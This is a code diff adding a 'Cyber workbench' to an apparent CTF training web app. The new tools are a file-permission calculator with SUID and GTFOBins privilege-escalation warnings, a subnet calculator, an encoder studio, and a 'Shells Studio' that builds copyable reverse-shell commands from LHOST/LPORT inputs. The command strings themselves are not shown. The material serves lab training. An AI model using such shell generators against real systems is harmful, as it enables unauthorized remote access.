+        <button class="btn outline perm-preset" data-preset="0644" style="font-size:11px">0644 (Standard File)</button>
+        <button class="btn outline perm-preset" data-preset="0777" style="font-size:11px">0777 (World Writable)</button>
+        <button class="btn outline perm-preset" data-preset="1777" style="font-size:11px">1777 (/tmp Sticky)</button>
+      </div>
+    </div>
+
+    <div style="background:#090d16;border:1px solid #1e293b;border-radius:6px;padding:16px;margin-bottom:20px;overflow-x:auto">
+      <table style="width:100%;border-collapse:collapse;text-align:center;font-size:13px">
+        <thead>
+          <tr style="border-bottom:1px solid #1e293b;color:var(--muted)">
+            <th style="padding:8px;text-align:left">CATEGORY</th>
+            <th style="padding:8px">READ (4)</th>
+            <th style="padding:8px">WRITE (2)</th>
+            <th style="padding:8px">EXECUTE (1)</th>
+            <th style="padding:8px">SPECIAL BIT</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="border-bottom:1px dashed #1e293b">
+            <td style="padding:10px;text-align:left;color:var(--fg);font-weight:bold">Owner (User)</td>
+            <td style="padding:10px"><input type="checkbox" id="chkUr" checked></td>
+            <td style="padding:10px"><input type="checkbox" id="chkUw" checked></td>
+            <td style="padding:10px"><input type="checkbox" id="chkUx" checked></td>
+            <td style="padding:10px"><label style="font-size:11px;color:var(--amber)"><input type="checkbox" id="chkSuid" checked> SetUID (4000)</label></td>
+          </tr>
+          <tr style="border-bottom:1px dashed #1e293b">
+            <td style="padding:10px;text-align:left;color:var(--fg);font-weight:bold">Group</td>
+            <td style="padding:10px"><input type="checkbox" id="chkGr" checked></td>
+            <td style="padding:10px"><input type="checkbox" id="chkGw"></td>
+            <td style="padding:10px"><input type="checkbox" id="chkGx" checked></td>
+            <td style="padding:10px"><label style="font-size:11px;color:var(--cyan)"><input type="checkbox" id="chkSgid"> SetGID (2000)</label></td>
+          </tr>
+          <tr>
+            <td style="padding:10px;text-align:left;color:var(--fg);font-weight:bold">Other (World)</td>
+            <td style="padding:10px"><input type="checkbox" id="chkOr" checked></td>
+            <td style="padding:10px"><input type="checkbox" id="chkOw"></td>
+            <td style="padding:10px"><input type="checkbox" id="chkOx" checked></td>
+            <td style="padding:10px"><label style="font-size:11px;color:var(--green)"><input type="checkbox" id="chkSticky"> Sticky Bit (1000)</label></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="note" id="permRiskBox" style="border-left-color:var(--amber)">
+      <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Security &amp; Privilege Escalation Assessment</h4>
+      <p id="permRiskText" style="color:#cbd5e1;line-height:1.7;margin:0">⚠️ CRITICAL PRIVILEGE ESCALATION RISK: SUID (Set User ID) is active. When executed by any unprivileged user, this binary runs with the file owner's privileges (typically root). If this binary is cataloged in GTFOBins, root privilege escalation is immediate.</p>
+    </div>
+  </div>
+  `;
+}
+
+function renderWorkbenchSubnets() {
+  const ip = state.workbenchSubnetIp || '10.10.14.23';
+  const prefix = state.workbenchSubnetPrefix || '24';
+  const res = calculateSubnet(ip, prefix);
+  return `
+  <div class="card" style="padding:24px">
+    <div class="card-top" style="margin-bottom:16px">
+      <div>
+        <h3 style="color:var(--cyan);margin:0 0 4px">IPv4 Subnet &amp; CIDR Range Calculator</h3>
+        <p style="color:#aeb6c5;font-size:13px;margin:0">Calculate network boundaries, broadcast addresses, usable host spans, and wildcard masks instantly for CTF target networks and lab scopes.</p>
+      </div>
+      <span class="tag success">Network Architecture</span>
+    </div>
+
+    <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
+      <div>
+        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">IPv4 HOST / NETWORK IP:</label>
+        <input type="text" id="subnetIp" value="${esc(ip)}" placeholder="e.g. 10.10.14.23" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px" autocomplete="off">
+      </div>
+      <div>
+        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">CIDR PREFIX MASK (/BITS):</label>
+        <select id="subnetPrefix" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px">
+          ${[8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32].map(n => `
+            <option value="${n}" ${String(n) === String(prefix) ? 'selected' : ''}>/${n} - Mask: ${getNetmaskFromPrefix(n)}</option>
+          `).join('')}
+        </select>
+      </div>
+    </div>
+
+    <div id="subnetResults" style="background:#090d16;border:1px solid #1e293b;border-radius:6px;padding:20px">
+      ${res.valid ? `
+        <div class="grid cols-2" style="gap:14px;font-size:13px">
+          <div><span style="color:var(--muted)">Network Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.network)}</strong></div>
+          <div><span style="color:var(--muted)">Broadcast Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.broadcast)}</strong></div>
+          <div><span style="color:var(--muted)">Subnet Mask:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.netmask)}</strong></div>
+          <div><span style="color:var(--muted)">Wildcard Mask:</span> <strong style="color:var(--amber);font-family:var(--mono)">${esc(res.wildcard)}</strong></div>
+          <div><span style="color:var(--muted)">Usable Host Range:</span> <strong style="color:#e2e8f0;font-family:var(--mono)">${esc(res.hostRange)}</strong></div>
+          <div><span style="color:var(--muted)">Total Usable Hosts:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.hosts)}</strong></div>
+          <div style="grid-column:span 2"><span style="color:var(--muted)">Scope / Class:</span> <strong style="color:var(--accent);font-family:var(--mono)">${esc(res.scope)}</strong></div>
+        </div>
+      ` : `<div style="color:var(--pink)">${esc(res.error)}</div>`}
+    </div>
+  </div>
+  `;
+}
+
 function libraryHTML() {
   const refs = [
     {title:'Official Documentation',items:[{name:'Linux man-pages project',desc:'Authoritative reference for system calls, library functions and file formats.',url:'https://man7.org/linux/man-pages/'},{name:'POSIX.1-2017',desc:'IEEE/Open Group standard for POSIX-compliant operating systems.',url:'https://pubs.opengroup.org/onlinepubs/9699919799/'},{name:'RFC Index',desc:'IETF Internet standards. Start with RFC 791 (IP), 793 (TCP), 7230 (HTTP/1.1).',url:'https://www.rfc-editor.org/rfc-index.html'},{name:'Intel x86/x64 ISA',desc:'Complete instruction set reference. Essential for assembly reading and ROP.',url:'https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html'}]},
@@ -1233,6 +1767,7 @@ function bindViewEvents() {
       if (a === 'goto-domains')     setView('domains');
       if (a === 'goto-curriculum')  setView('curriculum');
       if (a === 'goto-tricks')      setView('tricks');
+      if (a === 'goto-workbench')   setView('workbench');
       if (a === 'back-to-curriculum') { state.curriculumModule = null; setView('curriculum'); }
       if (a === 'complete-domain')  markDomain(btn.dataset.domainId);
     });
@@ -1386,6 +1921,309 @@ function bindViewEvents() {
     });
   });
 
+  /* Live Intel tabs */
+  view.querySelectorAll('[data-intel-tab]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      state.intelTab = btn.dataset.intelTab;
+      render();
+    });
+  });
+
+  /* Live Intel search */
+  const intelSearch = view.querySelector('#intelSearch');
+  if (intelSearch) {
+    intelSearch.addEventListener('input', () => {
+      state.intelQuery = intelSearch.value;
+      render();
+      const newIs = document.getElementById('intelSearch');
+      if (newIs) {
+        newIs.focus();
+        newIs.selectionStart = newIs.selectionEnd = newIs.value.length;
+      }
+    });
+  }
+
+  /* Live Intel threat dossier modal buttons */
+  view.querySelectorAll('[data-open-intel]').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      openIntelModal(btn.dataset.openIntel);
+    });
+  });
+
+  /* Workbench tabs */
+  view.querySelectorAll('[data-workbench-tab]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      state.workbenchTab = btn.dataset.workbenchTab;
+      render();
+    });
+  });
+
+  /* Workbench: Encoder Studio */
+  const encInp = view.querySelector('#encoderInput');
+  const encOut = view.querySelector('#encoderOutput');
+  const encFbk = view.querySelector('#encoderFeedback');
+
+  const setEncOutput = (text, err = '') => {
+    if (encOut) encOut.value = text;
+    if (encFbk) encFbk.textContent = err;
+  };
+
+  view.querySelector('#clearEncoderBtn')?.addEventListener('click', () => {
+    if (encInp) encInp.value = '';
+    setEncOutput('', '');
+  });
+
+  view.querySelector('#copyEncoderOutputBtn')?.addEventListener('click', async () => {
+    if (!encOut || !encOut.value) return;
+    try {
+      await navigator.clipboard.writeText(encOut.value);
+      const btn = view.querySelector('#copyEncoderOutputBtn');
+      const orig = btn.textContent;
+      btn.textContent = '✓ Copied!';
+      setTimeout(() => { btn.textContent = orig; }, 2000);
+    } catch (_) {}
+  });
+
+  view.querySelector('#btnB64Enc')?.addEventListener('click', () => {
+    try {
+      const v = encInp ? encInp.value : '';
+      setEncOutput(btoa(unescape(encodeURIComponent(v))), '');
+    } catch (e) {
+      setEncOutput('', 'Base64 encoding error: ' + e.message);
+    }
+  });
+
+  view.querySelector('#btnB64Dec')?.addEventListener('click', () => {
+    try {
+      const v = (encInp ? encInp.value : '').trim();
+      setEncOutput(decodeURIComponent(escape(atob(v))), '');
+    } catch (e) {
+      setEncOutput('', 'Base64 decoding error: Invalid padding or characters');
+    }
+  });
+
+  view.querySelector('#btnHexEnc')?.addEventListener('click', () => {
+    try {
+      const v = encInp ? encInp.value : '';
+      const hex = Array.from(new TextEncoder().encode(v)).map(b => b.toString(16).padStart(2, '0')).join('');
+      setEncOutput(hex, '');
+    } catch (e) {
+      setEncOutput('', 'Hex encoding error: ' + e.message);
+    }
+  });
+
+  view.querySelector('#btnHexDec')?.addEventListener('click', () => {
+    try {
+      const v = (encInp ? encInp.value : '').replace(/[^0-9a-fA-F]/g, '');
+      if (v.length % 2 !== 0) throw new Error('Hex string length must be even');
+      const bytes = [];
+      for (let i = 0; i < v.length; i += 2) bytes.push(parseInt(v.substr(i, 2), 16));
+      setEncOutput(new TextDecoder().decode(new Uint8Array(bytes)), '');
+    } catch (e) {
+      setEncOutput('', 'Hex decoding error: ' + e.message);
+    }
+  });
+
+  view.querySelector('#btnUrlEnc')?.addEventListener('click', () => {
+    const v = encInp ? encInp.value : '';
+    setEncOutput(encodeURIComponent(v), '');
+  });
+
+  view.querySelector('#btnUrlDec')?.addEventListener('click', () => {
+    try {
+      const v = encInp ? encInp.value : '';
+      setEncOutput(decodeURIComponent(v), '');
+    } catch (e) {
+      setEncOutput('', 'URL decoding error: Malformed URI sequence');
+    }
+  });
+
+  view.querySelector('#btnRot13')?.addEventListener('click', () => {
+    const v = encInp ? encInp.value : '';
+    const res = v.replace(/[a-zA-Z]/g, c => {
+      const base = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode(base + (c.charCodeAt(0) - base + 13) % 26);
+    });
+    setEncOutput(res, '');
+  });
+
+  view.querySelector('#btnBinEnc')?.addEventListener('click', () => {
+    const v = encInp ? encInp.value : '';
+    const bin = Array.from(new TextEncoder().encode(v)).map(b => b.toString(2).padStart(8, '0')).join(' ');
+    setEncOutput(bin, '');
+  });
+
+  view.querySelector('#btnBinDec')?.addEventListener('click', () => {
+    try {
+      const v = (encInp ? encInp.value : '').trim();
+      if (!v) { setEncOutput('', ''); return; }
+      const binArr = v.split(/\s+/).map(b => parseInt(b, 2));
+      setEncOutput(new TextDecoder().decode(new Uint8Array(binArr)), '');
+    } catch (e) {
+      setEncOutput('', 'Binary decoding error: Invalid binary bytes');
+    }
+  });
+
+  view.querySelector('#btnSha256')?.addEventListener('click', async () => {
+    try {
+      const v = encInp ? encInp.value : '';
+      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v));
+      const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+      setEncOutput(hex, '');
+    } catch (e) {
+      setEncOutput('', 'SHA-256 computation error: ' + e.message);
+    }
+  });
+
+  view.querySelector('#btnReverse')?.addEventListener('click', () => {
+    const v = encInp ? encInp.value : '';
+    setEncOutput(v.split('').reverse().join(''), '');
+  });
+
+  /* Workbench: Shells Studio */
+  const lhostInp = view.querySelector('#workbenchLhost');
+  const lportInp = view.querySelector('#workbenchLport');
+  const updateShells = () => {
+    if (lhostInp) state.workbenchLhost = lhostInp.value;
+    if (lportInp) state.workbenchLport = lportInp.value;
+    const shellsListEl = view.querySelector('#shellsList');
+    if (shellsListEl) {
+      const list = getShellsList(state.workbenchLhost, state.workbenchLport);
+      shellsListEl.innerHTML = list.map(sh => `
+        <article class="writeup-card" style="margin-bottom:14px">
+          <div class="card-top" style="align-items:flex-start">
+            <div>
+              <div class="tag-row" style="margin-bottom:4px">
+                <span class="tag accent">${esc(sh.cat.toUpperCase())}</span>
+              </div>
+              <h4 style="font-size:16px;color:var(--fg);margin:0">${esc(sh.name)}</h4>
+            </div>
+            <button class="btn outline copy-btn" data-copy-shell="${esc(sh.id)}">📋 Copy Command</button>
+          </div>
+          <p style="color:#aeb6c5;font-size:13px;line-height:1.6;margin:8px 0 10px">${esc(sh.desc)}</p>
+          <pre class="code-block" style="background:#090d16;padding:12px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto"><code id="shell-code-${esc(sh.id)}" style="color:#00ff88;font-size:13px;font-family:var(--mono)">${esc(sh.cmd)}</code></pre>
+        </article>
+      `).join('');
+      bindShellCopy();
+    }
+  };
+
+  const bindShellCopy = () => {
+    view.querySelectorAll('[data-copy-shell]').forEach(btn => {
+      btn.addEventListener('click', async (e) => {
+        e.stopPropagation();
+        const id = btn.dataset.copyShell;
+        const codeEl = view.querySelector(`#shell-code-${id}`);
+        if (codeEl) {
+          try {
+            await navigator.clipboard.writeText(codeEl.textContent);
+            const orig = btn.textContent;
+            btn.textContent = '✓ Copied!';
+            setTimeout(() => { btn.textContent = orig; }, 2000);
+          } catch (_) {}
+        }
+      });
+    });
+  };
+  if (lhostInp) lhostInp.addEventListener('input', updateShells);
+  if (lportInp) lportInp.addEventListener('input', updateShells);
+  bindShellCopy();
+
+  /* Workbench: Permissions Calculator */
+  const permOctal = view.querySelector('#permOctal');
+  const permSymbolic = view.querySelector('#permSymbolic');
+  const permRiskText = view.querySelector('#permRiskText');
+  const permRiskBox = view.querySelector('#permRiskBox');
+
+  const updatePermCalc = (fromOctal) => {
+    if (!permOctal || !permSymbolic) return;
+    let s = 4, u = 7, g = 5, o = 5;
+
+    if (fromOctal) {
+      let raw = (permOctal.value || '0000').replace(/[^0-7]/g, '');
+      if (raw.length < 4) raw = raw.padStart(4, '0');
+      s = parseInt(raw[raw.length - 4], 10) || 0;
+      u = parseInt(raw[raw.length - 3], 10) || 0;
+      g = parseInt(raw[raw.length - 2], 10) || 0;
+      o = parseInt(raw[raw.length - 1], 10) || 0;
+
+      const setChk = (id, cond) => { const el = view.querySelector(id); if (el) el.checked = !!cond; };
+      setChk('#chkSuid', s & 4); setChk('#chkSgid', s & 2); setChk('#chkSticky', s & 1);
+      setChk('#chkUr', u & 4); setChk('#chkUw', u & 2); setChk('#chkUx', u & 1);
+      setChk('#chkGr', g & 4); setChk('#chkGw', g & 2); setChk('#chkGx', g & 1);
+      setChk('#chkOr', o & 4); setChk('#chkOw', o & 2); setChk('#chkOx', o & 1);
+    } else {
+      const isChk = id => view.querySelector(id)?.checked;
+      s = (isChk('#chkSuid') ? 4 : 0) + (isChk('#chkSgid') ? 2 : 0) + (isChk('#chkSticky') ? 1 : 0);
+      u = (isChk('#chkUr') ? 4 : 0) + (isChk('#chkUw') ? 2 : 0) + (isChk('#chkUx') ? 1 : 0);
+      g = (isChk('#chkGr') ? 4 : 0) + (isChk('#chkGw') ? 2 : 0) + (isChk('#chkGx') ? 1 : 0);
+      o = (isChk('#chkOr') ? 4 : 0) + (isChk('#chkOw') ? 2 : 0) + (isChk('#chkOx') ? 1 : 0);
+      permOctal.value = `${s}${u}${g}${o}`;
+    }
+
+    const sym = [
+      '-',
+      (u & 4) ? 'r' : '-', (u & 2) ? 'w' : '-', (s & 4) ? ((u & 1) ? 's' : 'S') : ((u & 1) ? 'x' : '-'),
+      (g & 4) ? 'r' : '-', (g & 2) ? 'w' : '-', (s & 2) ? ((g & 1) ? 's' : 'S') : ((g & 1) ? 'x' : '-'),
+      (o & 4) ? 'r' : '-', (o & 2) ? 'w' : '-', (s & 1) ? ((o & 1) ? 't' : 'T') : ((o & 1) ? 'x' : '-')
+    ].join('');
+    permSymbolic.textContent = sym;
+
+    let risks = [];
+    if (s & 4) risks.push('⚠️ CRITICAL PRIVILEGE ESCALATION RISK: SUID (Set User ID) is active. When executed by any unprivileged user, this binary runs with the file owner\'s privileges (typically root). Check GTFOBins for instant root escalations.');
+    if (s & 2) risks.push('⚠️ ELEVATED RISK: SGID (Set Group ID) is active. Executes with group permissions or enforces group inheritance on directories.');
+    if (o & 2) risks.push('🚨 CRITICAL INTEGRITY RISK: World-writable (Other write enabled). Any local user or restricted daemon process can modify or overwrite this file.');
+    if (s & 1) risks.push('ℹ️ STICKY BIT ACTIVE: Restricted deletion flag set (prevents deletion except by owner, standard for /tmp).');
+    if (!risks.length) risks.push('✅ STANDARD PERMISSION MODEL: No elevated special execution bits detected.');
+
+    if (permRiskText) permRiskText.innerHTML = risks.join('<br><br>');
+    if (permRiskBox) permRiskBox.style.borderLeftColor = (s & 4 || o & 2) ? 'var(--pink)' : (s & 2) ? 'var(--amber)' : 'var(--green)';
+  };
+
+  if (permOctal) {
+    permOctal.addEventListener('input', () => updatePermCalc(true));
+    ['#chkSuid','#chkSgid','#chkSticky','#chkUr','#chkUw','#chkUx','#chkGr','#chkGw','#chkGx','#chkOr','#chkOw','#chkOx'].forEach(sel => {
+      view.querySelector(sel)?.addEventListener('change', () => updatePermCalc(false));
+    });
+    view.querySelectorAll('.perm-preset').forEach(btn => {
+      btn.addEventListener('click', () => {
+        permOctal.value = btn.dataset.preset;
+        updatePermCalc(true);
+      });
+    });
+    updatePermCalc(true);
+  }
+
+  /* Workbench: Subnets Calculator */
+  const subIp = view.querySelector('#subnetIp');
+  const subPfx = view.querySelector('#subnetPrefix');
+  const subRes = view.querySelector('#subnetResults');
+
+  const updateSubnetCalc = () => {
+    if (!subIp || !subPfx || !subRes) return;
+    state.workbenchSubnetIp = subIp.value;
+    state.workbenchSubnetPrefix = subPfx.value;
+    const res = calculateSubnet(subIp.value, subPfx.value);
+    if (res.valid) {
+      subRes.innerHTML = `
+        <div class="grid cols-2" style="gap:14px;font-size:13px">
+          <div><span style="color:var(--muted)">Network Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.network)}</strong></div>
+          <div><span style="color:var(--muted)">Broadcast Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.broadcast)}</strong></div>
+          <div><span style="color:var(--muted)">Subnet Mask:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.netmask)}</strong></div>
+          <div><span style="color:var(--muted)">Wildcard Mask:</span> <strong style="color:var(--amber);font-family:var(--mono)">${esc(res.wildcard)}</strong></div>
+          <div><span style="color:var(--muted)">Usable Host Range:</span> <strong style="color:#e2e8f0;font-family:var(--mono)">${esc(res.hostRange)}</strong></div>
+          <div><span style="color:var(--muted)">Total Usable Hosts:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.hosts)}</strong></div>
+          <div style="grid-column:span 2"><span style="color:var(--muted)">Scope / Class:</span> <strong style="color:var(--accent);font-family:var(--mono)">${esc(res.scope)}</strong></div>
+        </div>
+      `;
+    } else {
+      subRes.innerHTML = `<div style="color:var(--pink)">${esc(res.error)}</div>`;
+    }
+  };
+  if (subIp) subIp.addEventListener('input', updateSubnetCalc);
+  if (subPfx) subPfx.addEventListener('change', updateSubnetCalc);
+
   /* Glossary search */
   const gs = view.querySelector('#glossarySearch');
   if (gs) {
@@ -1510,6 +2348,16 @@ function init() {
     btn.dataset.view = 'tricks';
     btn.innerHTML = '<span>13</span> Tricks &amp; tips';
     btn.addEventListener('click', () => setView('tricks'));
+    mainNav.appendChild(btn);
+  }
+
+  /* Add Workbench nav item if not present */
+  if (mainNav && !mainNav.querySelector('[data-view="workbench"]')) {
+    const btn = document.createElement('button');
+    btn.className = 'nav-item';
+    btn.dataset.view = 'workbench';
+    btn.innerHTML = '<span>14</span> Cyber workbench';
+    btn.addEventListener('click', () => setView('workbench'));
     mainNav.appendChild(btn);
   }
 
